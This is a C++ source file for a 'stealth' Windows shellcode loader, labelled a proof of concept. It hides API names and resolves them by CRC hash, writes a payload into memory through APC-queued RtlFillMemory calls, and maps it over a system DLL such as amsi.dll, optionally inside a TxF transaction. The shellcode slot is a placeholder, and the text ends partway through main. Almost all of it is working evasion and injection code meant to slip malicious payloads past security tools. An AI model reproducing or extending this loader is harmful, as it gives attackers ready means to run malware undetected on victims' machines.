/****
 * Stealth NeZha loader: a APC write method with DLL overloading
 * a PoC only, no DLL searching or error handling
 * Add syscall for create thread
 * Add dynamic loading for NT functions resolved by CRC
 * Author: Thomas X Meng
 * 
*/
#include <windows.h>
#include <winternl.h> // For NTSTATUS definitions
#include <psapi.h>
#include <stdlib.h> // For ExitProcess
#include <tlhelp32.h>
#include <stdio.h>
#include <ctype.h>

#include <stdint.h>

///For dynamic loading: 
#include "processthreadsapi.h"
#include "libloaderapi.h"
#include <winnt.h>
#include <lmcons.h>


/////////////////////////////////// Dynamic loading: 
#define ADDR unsigned __int64

uint32_t crc32c(const char *s) {
    int      i;
    uint32_t crc=0;
    
    while (*s) {
        crc ^= (uint8_t)(*s++ | 0x20);
        
        for (i=0; i<8; i++) {
            crc = (crc >> 1) ^ (0x82F63B78 * (crc & 1));
        }
    }
    return crc;
}

// Utility function to convert an UNICODE_STRING to a char*
HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA) {
	ULONG cbAnsi, cCharacters;
	DWORD dwError;
	// If input is null then just return the same.    
	if (pszW == NULL)
	{
		*ppszA = NULL;
		return NOERROR;
	}
	cCharacters = wcslen(pszW) + 1;
	cbAnsi = cCharacters * 2;

	*ppszA = (LPSTR)CoTaskMemAlloc(cbAnsi);
	if (NULL == *ppszA)
		return E_OUTOFMEMORY;

	if (0 == WideCharToMultiByte(CP_ACP, 0, pszW, cCharacters, *ppszA, cbAnsi, NULL, NULL))
	{
		dwError = GetLastError();
		CoTaskMemFree(*ppszA);
		*ppszA = NULL;
		return HRESULT_FROM_WIN32(dwError);
	}
	return NOERROR;
}

namespace dynamic {
    // Dynamically finds the base address of a DLL in memory
    ADDR find_dll_base(const char* dll_name) {
        // Note: the PEB can also be found using NtQueryInformationProcess, but this technique requires a call to GetProcAddress
        //  and GetModuleHandle which defeats the very purpose of this PoC
        // Well, this is a chicken and egg problem, we have to call those 2 functions stealthly. 
        PTEB teb = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
        PPEB_LDR_DATA loader = teb->ProcessEnvironmentBlock->Ldr;

        PLIST_ENTRY head = &loader->InMemoryOrderModuleList;
        PLIST_ENTRY curr = head->Flink;

        // Iterate through every loaded DLL in the current process
        do {
            PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            char* dllName;
            // Convert unicode buffer into char buffer for the time of the comparison, then free it
            UnicodeToAnsi(dllEntry->FullDllName.Buffer, &dllName);
            char* result = strstr(dllName, dll_name);
            CoTaskMemFree(dllName); // Free buffer allocated by UnicodeToAnsi

            if (result != NULL) {
                // Found the DLL entry in the PEB, return its base address
                return (ADDR)dllEntry->DllBase;
            }
            curr = curr->Flink;
        } while (curr != head);

        return NULL;
    }

    // Given the base address of a DLL in memory, returns the address of an exported function
    ADDR find_dll_export(ADDR dll_base, const char* export_name) {
        // Read the DLL PE header and NT header
        PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
        PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);

        // The RVA of the export table if indicated in the PE optional header
        // Read it, and read the export table by adding the RVA to the DLL base address in memory
        DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);

        // Browse every export of the DLL. For the i-th export:
        // - The i-th element of the name table contains the export name
        // - The i-th element of the ordinal table contains the index with which the functions table must be indexed to get the final function address
        DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
        WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
        DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);

        for (int i = 0; i < exportTable->NumberOfNames; ++i) {
            char* funcName = (char*)(dll_base + name_table[i]);
            ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
            if (!_strcmpi(funcName, export_name)) {
                return func_ptr;
            }
        }

        return NULL;
    }

    // Given the base address of a DLL in memory, returns the address of an exported function by hash
    ADDR find_dll_export_by_hash(ADDR dll_base, uint32_t target_hash) {
        PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
        PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);
        DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);

        DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
        WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
        DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);

        for (DWORD i = 0; i < exportTable->NumberOfNames; ++i) {
            char* funcName = (char*)(dll_base + name_table[i]);
            uint32_t hash = crc32c(funcName);
            if (hash == target_hash) {
                ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
                return func_ptr;
            }
        }

        return NULL; // Function not found
    }


    using LoadLibraryPrototype = HMODULE(WINAPI*)(LPCWSTR);
    LoadLibraryPrototype loadFuture;
    using GetModuleHandlePrototype = HMODULE(WINAPI*)(LPCSTR);
    GetModuleHandlePrototype GetModuleHandle;
    using GetProcAddressPrototype = FARPROC(WINAPI*)(HMODULE, LPCSTR);
    GetProcAddressPrototype NotGetProcAddress;

    void resolve_imports(void) {

        const char essentialLib[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
        const char EssentialLib[] = { 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', 0 };
        const char GetFutureStr[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0 };
        const char LoadFutureStr[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0 };
        const char GetModuleHandleStr[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0 };
        ADDR kernel32_base = find_dll_base(EssentialLib);
        // Example hashes for critical functions
        uint32_t hash_GetProcAddress = crc32c(GetFutureStr);
        uint32_t hash_LoadLibraryW = crc32c(LoadFutureStr);
        uint32_t hash_GetModuleHandleA = crc32c(GetModuleHandleStr);

        // Resolve functions by hash
        dynamic::NotGetProcAddress = (GetProcAddressPrototype)find_dll_export_by_hash(kernel32_base, hash_GetProcAddress);
        dynamic::GetModuleHandle = (GetModuleHandlePrototype)find_dll_export_by_hash(kernel32_base, hash_GetModuleHandleA);
        #define _import(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleHandle(essentialLib), _name))
        dynamic::loadFuture = (LoadLibraryPrototype) _import(LoadFutureStr, LoadLibraryPrototype);    
        // Verify the resolution
        if (dynamic::NotGetProcAddress != NULL && dynamic::loadFuture != NULL && dynamic::GetModuleHandle != NULL) {
            printf("[+] APIs resolved by hash successfully.\n");
        } else {
            printf("[-] Error resolving APIs by hash.\n");
        }

        // dynamic::GetProcAddress = (GetProcAddressPrototype) find_dll_export(kernel32_base, "GetProcAddress");
        // dynamic::GetModuleHandle = (GetModuleHandlePrototype) find_dll_export(kernel32_base, "GetModuleHandleA");
        // #define _import(_name, _type) ((_type) dynamic::GetProcAddress(dynamic::GetModuleHandle("kernel32.dll"), _name))
        // dynamic::loadFuture = (LoadLibraryPrototype) _import("LoadLibraryW", LoadLibraryPrototype);
        printf("[+] LoadLibrary: %p\n", loadFuture);
    }
}
////////////////////////////////////
const char* ProtectionToString(DWORD protection) {
    switch (protection) {
        case PAGE_NOACCESS: return "PAGE_NOACCESS";
        case PAGE_READONLY: return "PAGE_READONLY";
        case PAGE_READWRITE: return "PAGE_READWRITE";
        case PAGE_WRITECOPY: return "PAGE_WRITECOPY";
        case PAGE_EXECUTE: return "PAGE_EXECUTE";
        case PAGE_EXECUTE_READ: return "PAGE_EXECUTE_READ";
        case PAGE_EXECUTE_READWRITE: return "PAGE_EXECUTE_READWRITE";
        case PAGE_EXECUTE_WRITECOPY: return "PAGE_EXECUTE_WRITECOPY";
        case PAGE_GUARD: return "PAGE_GUARD";
        case PAGE_NOCACHE: return "PAGE_NOCACHE";
        case PAGE_WRITECOMBINE: return "PAGE_WRITECOMBINE";
        default: return "UNKNOWN";
    }
}


// Necessary for certain definitions like ACCESS_MASK
#ifndef WIN32_NO_STATUS
#define WIN32_NO_STATUS
#include <ntstatus.h>
#undef WIN32_NO_STATUS
#else
#include <ntstatus.h>
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

BOOL FindSuitableDLL(wchar_t* dllPath, SIZE_T bufferSize, DWORD requiredSize, BOOL bTxF, int dllOrder);
BOOL PrintSectionDetails(const wchar_t* dllPath);

void PrintUsageAndExit() {
    wprintf(L"Usage: loader_21.exe [-txf] [-dll <order>] [-h]\n");
    wprintf(L"Options:\n");
    wprintf(L"  -txf                Use Transactional NTFS (TxF) for DLL loading.\n");
    wprintf(L"  -dll <order>        Specify the order of the suitable DLL to use (default is 1). Not all DLLs are suitable for overloading\n");
    wprintf(L"  -h                  Print this help message and exit.\n");
    wprintf(L"  -thread             Use an alternative NT call other than the NT create thread\n");
    wprintf(L"  -pool               Use Threadpool for APC Write\n");
    ExitProcess(0);
}


BOOL ValidateDLLCharacteristics(const wchar_t* dllPath, uint32_t requiredSize) {
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE; // Cannot open file
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* buffer = new BYTE[fileSize]; // Allocate buffer for the whole file
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // Failed to read file
    }

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)buffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // Not a valid PE file
    }

    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(buffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // Not a valid PE file
    }

    // Check if SizeOfImage is sufficient
    if (ntHeaders->OptionalHeader.SizeOfImage < requiredSize) {
        CloseHandle(hFile);
        return FALSE; // Image size is not sufficient
    }

    printf("[+] SizeOfImage: %lu\n", ntHeaders->OptionalHeader.SizeOfImage);

    // Validate the .text section specifically
    IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(IMAGE_NT_HEADERS));
    BOOL textSectionFound = FALSE;
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER* section = &sectionHeaders[i];
        if (strncmp((char*)section->Name, ".text", 5) == 0) {
            textSectionFound = TRUE;
            if (section->Misc.VirtualSize < requiredSize) {
                CloseHandle(hFile);
                delete[] buffer;
                return FALSE; // .text section size is not sufficient
            }
            break;
        }
    }

    printf("[+] .text section found: %s\n", textSectionFound ? "Yes" : "No");
    //print the size of the .text section in human readable format:
    printf("[+] .text section size: %lu bytes\n", sectionHeaders->Misc.VirtualSize);

    if (!textSectionFound) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // .text section not found
    }

    CloseHandle(hFile);
    delete[] buffer;
    return TRUE; // DLL is suitable
}


BOOL FindSuitableDLL(wchar_t* dllPath, SIZE_T bufferSize, DWORD requiredSize, BOOL bTxF, int dllOrder) {
    WIN32_FIND_DATAW findData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    wchar_t systemDir[MAX_PATH] = { 0 };
    wchar_t searchPath[MAX_PATH] = { 0 };
    int foundCount = 0; // Count of suitable DLLs found

    // Get the system directory path
    if (!GetSystemDirectoryW(systemDir, _countof(systemDir))) {
        wprintf(L"Failed to get system directory. Error: %lu\n", GetLastError());
        return FALSE;
    }

    // Construct the search path for DLLs in the system directory
    swprintf_s(searchPath, _countof(searchPath), L"%s\\*.dll", systemDir);

    hFind = FindFirstFileW(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        wprintf(L"Failed to find first file. Error: %lu\n", GetLastError());
        return FALSE;
    }

    do {
        // Skip directories
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;
        }

        wchar_t fullPath[MAX_PATH];
        swprintf_s(fullPath, _countof(fullPath), L"%s\\%s", systemDir, findData.cFileName);

        if (GetModuleHandleW(findData.cFileName) == NULL && ValidateDLLCharacteristics(fullPath, requiredSize)) {
            foundCount++; // Increment the suitable DLL count
            if (foundCount == dllOrder) { // If the count matches the specified order
                // For simplicity, we're not using bTxF here, but you could adjust your logic
                // to use it for filtering or preparing DLLs for TxF based operations.
                // swprintf_s(fullPath, MAX_PATH, L"%s\\%s", systemDir, findData.cFileName);
                wcsncpy_s(dllPath, bufferSize, fullPath, _TRUNCATE);
                FindClose(hFind);
                PrintSectionDetails(fullPath);
                return TRUE; // Found the DLL in the specified order
            }
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
    return FALSE;
}

//////////////////////////////////// TxF: 
typedef NTSTATUS (NTAPI *pRtlCreateUserThread)(
    HANDLE ProcessHandle,
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN CreateSuspended,
    ULONG StackZeroBits,
    PULONG StackReserved,
    PULONG StackCommit,
    PVOID StartAddress,
    PVOID StartParameter,
    PHANDLE ThreadHandle,
    PCLIENT_ID ClientID);


// Define the NT API function pointers
typedef LONG(__stdcall* NtCreateSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
// typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

typedef NTSTATUS(__stdcall* NtCreateTransaction_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);

NtCreateSection_t NtCreateSection;
NtMapViewOfSection_t NtMapViewOfSection;
NtCreateTransaction_t NtCreateTransaction;

const wchar_t essentialLibW[] = { L'n', L't', L'd', L'l', L'l', 0 };
// Load NT functions
void LoadNtFunctions() {
    dynamic::resolve_imports();
    HMODULE hNtdll = dynamic::loadFuture(essentialLibW);
    // HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");

    const char NtCreateFutureStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtFutureTranscationStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'r', 'a', 'n', 's', 'a', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtViewFutureStr[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
    //we should output
    NtCreateSection = (NtCreateSection_t)dynamic::NotGetProcAddress(hNtdll, NtCreateFutureStr);
    NtMapViewOfSection = (NtMapViewOfSection_t)dynamic::NotGetProcAddress(hNtdll, NtViewFutureStr);
    NtCreateTransaction = (NtCreateTransaction_t)dynamic::NotGetProcAddress(hNtdll, NtFutureTranscationStr);
}


/////////////////////////////////////// APC Write:

#define NT_CREATE_THREAD_EX_SUSPENDED 1
#define NT_CREATE_THREAD_EX_ALL_ACCESS 0x001FFFFF
// Declaration of undocumented functions and structures
typedef ULONG (NTAPI *NtQueueApcThread_t)(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcRoutineContext, PVOID ApcStatusBlock, PVOID ApcReserved);
typedef ULONG (NTAPI *NtCreateThreadEx_t)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);

// // Function to write memory using APCs with an option to choose the thread creation method
// DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength, BOOL useRtlCreateUserThread) {
//     HANDLE hThread = NULL;
//     NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueueApcThread");
//     void *pRtlFillMemory = (void*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlFillMemory");

//     if (!pNtQueueApcThread || !pRtlFillMemory) {
//         printf("[-] Failed to locate required functions.\n");
//         return 1;
//     }

//     if (useRtlCreateUserThread) {
//         pRtlCreateUserThread RtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCreateUserThread");
//         if (!RtlCreateUserThread) {
//             printf("[-] Failed to locate RtlCreateUserThread.\n");
//             return 1;
//         }

//         CLIENT_ID ClientID;
//         NTSTATUS ntStatus = RtlCreateUserThread(
//             hProcess,
//             NULL, // SecurityDescriptor
//             TRUE, // CreateSuspended - not directly supported, handle suspension separately
//             0, // StackZeroBits
//             NULL, // StackReserved
//             NULL, // StackCommit
//             (PVOID)(ULONG_PTR)ExitThread, // StartAddress, using ExitThread as a placeholder
//             NULL, // StartParameter
//             &hThread,
//             &ClientID);

//         if (ntStatus != STATUS_SUCCESS) {
//             printf("[-] RtlCreateUserThread failed: %x\n", ntStatus);
//             return 1;
//         }
//         printf("[+] RtlCreateUserThread succeeded\n");
//         // Immediately suspend the thread to mimic the NT_CREATE_THREAD_EX_SUSPENDED flag behavior
//         // SuspendThread(hThread);
//     } else {
//         NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
//         if (!pNtCreateThreadEx) {
//             printf("[-] Failed to locate NtCreateThreadEx.\n");
//             return 1;
//         }

//         ULONG status = pNtCreateThreadEx(
//             &hThread,
//             NT_CREATE_THREAD_EX_ALL_ACCESS,
//             NULL,
//             hProcess,
//             (PVOID)(ULONG_PTR)ExitThread,
//             NULL,
//             NT_CREATE_THREAD_EX_SUSPENDED,
//             0,
//             0,
//             0,
//             NULL);

//         if (status != 0) {
//             printf("[-] Failed to create remote thread: %lu\n", status);
//             return 1;
//         }
//         printf("[+] NtCreateThreadEx succeeded\n");
//     }

//     // Write memory using APCs
//     for (DWORD i = 0; i < dwLength; i++) {
//         BYTE byte = pData[i];

//         // Print only for the first and last byte
//         if (i == 0 || i == dwLength - 1) {
//             printf("[+] Writing byte 0x%02X to address %p\n", byte, (void*)((BYTE*)pAddress + i));
//         }
//         ULONG result  = pNtQueueApcThread(hThread, pRtlFillMemory, pAddress + i, (PVOID)1, (PVOID)(ULONG_PTR)byte); 
//         if (result != STATUS_SUCCESS) {
//             printf("[-] Failed to queue APC. NTSTATUS: 0x%X\n", result);
//             TerminateThread(hThread, 0);
//             CloseHandle(hThread);
//             return 1;
//         }
//     }

//     // Resume the thread to execute queued APCs and then wait for completion
//     ResumeThread(hThread);
//     WaitForSingleObject(hThread, INFINITE);

//     printf("[+] APC write completed\n");
//     CloseHandle(hThread);
//     return 0;
// }

// Function to write memory using APCs with an option to choose the thread creation method
DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength, BOOL useRtlCreateUserThread, BOOL bUseCreateThreadpoolWait) {
    HANDLE hThread = NULL;
    HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);

    const char getLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
    const char NtQueueFutureApcStr[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
    const char NtFillFutureMemoryStr[] = { 'R', 't', 'l', 'F', 'i', 'l', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcStr);
    void *pRtlFillMemory = (void*)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtFillFutureMemoryStr);

    if (!pNtQueueApcThread || !pRtlFillMemory) {
        printf("[-] Failed to locate required functions.\n");
        return 1;
    }

    if(!bUseCreateThreadpoolWait){
        if (useRtlCreateUserThread) {
            pRtlCreateUserThread RtlCreateUserThread = (pRtlCreateUserThread)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCreateUserThread");
            if (!RtlCreateUserThread) {
                printf("[-] Failed to locate RtlCreateUserThread.\n");
                return 1;
            }

            CLIENT_ID ClientID;
            NTSTATUS ntStatus = RtlCreateUserThread(
                hProcess,
                NULL, // SecurityDescriptor
                TRUE, // CreateSuspended - not directly supported, handle suspension separately
                0, // StackZeroBits
                NULL, // StackReserved
                NULL, // StackCommit
                (PVOID)(ULONG_PTR)ExitThread, // StartAddress, using ExitThread as a placeholder
                NULL, // StartParameter
                &hThread,
                &ClientID);

            if (ntStatus != STATUS_SUCCESS) {
                printf("[-] RtlCreateUserThread failed: %x\n", ntStatus);
                return 1;
            }
            printf("[+] RtlCreateUserThread succeeded\n");
            // Immediately suspend the thread to mimic the NT_CREATE_THREAD_EX_SUSPENDED flag behavior
            // SuspendThread(hThread);
        } else {
            NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
            if (!pNtCreateThreadEx) {
                printf("[-] Failed to locate NtCreateThreadEx.\n");
                return 1;
            }

            ULONG status = pNtCreateThreadEx(
                &hThread,
                NT_CREATE_THREAD_EX_ALL_ACCESS,
                NULL,
                hProcess,
                (PVOID)(ULONG_PTR)ExitThread,
                NULL,
                NT_CREATE_THREAD_EX_SUSPENDED,
                0,
                0,
                0,
                NULL);

            if (status != 0) {
                printf("[-] Failed to create remote thread: %lu\n", status);
                return 1;
            }
            printf("[+] NtCreateThreadEx succeeded\n");
        }
    } else {
        hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
        if(!hThread) {
            printf("[-] Failed to open thread: %lu\n", GetLastError());
            return 1;
        }
    }

    // Write memory using APCs
    for (DWORD i = 0; i < dwLength; i++) {
        BYTE byte = pData[i];

        // Print only for the first and last byte
        if (i == 0 || i == dwLength - 1) {
            printf("[+] Writing byte 0x%02X to address %p\n", byte, (void*)((BYTE*)pAddress + i));
        }
        ULONG result  = pNtQueueApcThread(hThread, pRtlFillMemory, pAddress + i, (PVOID)1, (PVOID)(ULONG_PTR)byte); 
        if (result != STATUS_SUCCESS) {
            printf("[-] Failed to queue APC. NTSTATUS: 0x%X\n", result);
            TerminateThread(hThread, 0);
            CloseHandle(hThread);
            return 1;
        }
    }

    // Resume the thread to execute queued APCs and then wait for completion
    if(!bUseCreateThreadpoolWait){
        ResumeThread(hThread);
        WaitForSingleObject(hThread, INFINITE);
    } else {
        // Create a thread pool wait object
        PTP_WAIT ptpWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)pRtlFillMemory, NULL, NULL);
        // PTP_WAIT ptpWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)ExitThread, NULL, NULL);

        if (ptpWait == NULL) {
            printf("[-] Failed to create thread pool wait object: %lu\n", GetLastError());
            return 1;
        }

        // Associate the wait object with the thread pool
        SetThreadpoolWait(ptpWait, event, NULL);
        printf("[+] Thread pool wait object created\n");
        // WaitForSingleObject(event, INFINITE);
        WaitForThreadpoolWaitCallbacks(ptpWait, FALSE);
        // CreateThreadpoolWait
        // SetThreadpoolWait
        // WaitForThreadpoolWaitCallbacks
        // CloseThreadpoolWait
    }   


    printf("[+] APC write completed\n");
    CloseHandle(hThread);
    return 0;
}


////////////////////////////////////////

unsigned char magiccode[] = ####SHELLCODE####;

int main(int argc, char *argv[])
{
    printf("Starting program...\n");

    // // Open the DLL file to read headers
    // HANDLE fileHandle = CreateFile("C:\\windows\\system32\\amsi.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    // if (fileHandle == INVALID_HANDLE_VALUE) {
    //     printf("Failed to open DLL file. Error: %lu\n", GetLastError());
    //     return 1;
    // } else {
	// 	printf("[+] DLL file amsi.dll opened.\n");
	// }

    // HANDLE fileMapping = CreateFileMapping(fileHandle, NULL, PAGE_READONLY, 0, 0, NULL);
    // if (fileMapping == NULL) {
    //     printf("Failed to create file mapping. Error: %lu\n", GetLastError());
    //     CloseHandle(fileHandle);
    //     return 1;
    // } else {
	// 	printf("[+] File mapping created.\n");
	// }

    // LPVOID fileBase = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
    // if (fileBase == NULL) {
    //     printf("Failed to map view of file. Error: %lu\n", GetLastError());
    //     CloseHandle(fileMapping);
    //     CloseHandle(fileHandle);
    //     return 1;
    // } else {
	// 	printf("[+] File mapped.\n");
	//  }

    // Default value for bTxF
    BOOL bTxF = FALSE, bUseCustomDLL = FALSE; // Flag to indicate whether to search for a suitable DLL
    int dllOrder = 1; // Default to the first suitable DLL

    BOOL bUseRtlCreateUserThread = FALSE, bUseCreateThreadpoolWait = FALSE; // Default to FALSE


    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0) {
            PrintUsageAndExit();
            return 0; // Assuming PrintUsageAndExit() does not exit the program
        }
        
        if (i + 1 < argc && strcmp(argv[i], "-dll") == 0) {
            dllOrder = atoi(argv[i + 1]);
            bUseCustomDLL = TRUE;
            i++; // Skip next argument as it's already processed
        } else if (strcmp(argv[i], "-txf") == 0) {
            bTxF = TRUE;
        } else if (strcmp(argv[i], "-thread") == 0) {
            bUseRtlCreateUserThread = TRUE;
        } else if (strcmp(argv[i], "-pool") == 0) {
            bUseCreateThreadpoolWait = TRUE;
        }

        // Check for mutual exclusivity early
        if (bUseCreateThreadpoolWait && bUseRtlCreateUserThread) {
            printf("[-] Both -thread and -pool flags cannot be used together. Exiting.\n");
            return 1;
        }
    }


    if(bUseCreateThreadpoolWait) {
        printf("[+] Using CreateThreadpoolWait function.\n");
    } else {
        // print whether use alternative thread calling function, printf which method will be used:
        printf("[+] Using %s thread calling function.\n", bUseRtlCreateUserThread ? "RtlCreateUserThread" : "NtCreateThreadEx");
    }

    // Display debug message about transaction mode
    printf("[+] Transaction Mode: %s\n", bTxF ? "Enabled" : "Disabled");

    LoadNtFunctions(); // Load the NT functions

    wchar_t dllPath[MAX_PATH] = {0}; // Buffer to store the path of the chosen DLL


    if (bUseCustomDLL) {
        DWORD requiredSize = sizeof(magiccode); // Calculate the required size based on the magiccode array size
        printf("[+] Required size: %lu bytes\n", requiredSize);

        // Attempt to find a suitable DLL, now passing the calculated requiredSize
        if (!FindSuitableDLL(dllPath, sizeof(dllPath) / sizeof(wchar_t), requiredSize, bTxF, dllOrder)) {
            wprintf(L"[-] No suitable DLL found in the specified order. Falling back to default.\n");
            wcscpy_s(dllPath, L"C:\\windows\\system32\\amsi.dll"); // Default to amsi.dll
        } else {
            // wprintf(L"Using DLL: %s\n", dllPath);
        }
    } else {
        printf("[-] No custom DLL specified. Falling back to amsi.dll.\n");
        wcscpy_s(dllPath, L"C:\\windows\\system32\\amsi.dll"); // Use the default amsi.dll
    }

    wprintf(L"[+] Using DLL: %ls\n", dllPath);
    wprintf(L"[+] TxF Mode: %ls\n", bTxF ? L"Enabled" : L"Disabled");

    /// deal with TxF argument
    HANDLE fileHandle;
    if (bTxF) {
        OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES) };
        HANDLE hTransaction;
        NTSTATUS NtStatus = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &ObjAttr, nullptr, nullptr, 0, 0, 0, nullptr, nullptr);
        if (!NT_SUCCESS(NtStatus)) {
            printf("[-] Failed to create transaction (error 0x%x)\n", NtStatus);
            return 1;
        }

        // Display debug message about creating transaction
        printf("[+] Transaction created successfully.\n");

        fileHandle = CreateFileTransactedW(dllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr, hTransaction, nullptr, nullptr);
        if (fileHandle == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open DLL file transacted. Error: %lu\n", GetLastError());
            CloseHandle(hTransaction);
            return 1;
        }

        // Display debug message about opening DLL file transacted
        printf("[+] DLL file opened transacted successfully.\n");
    } else {
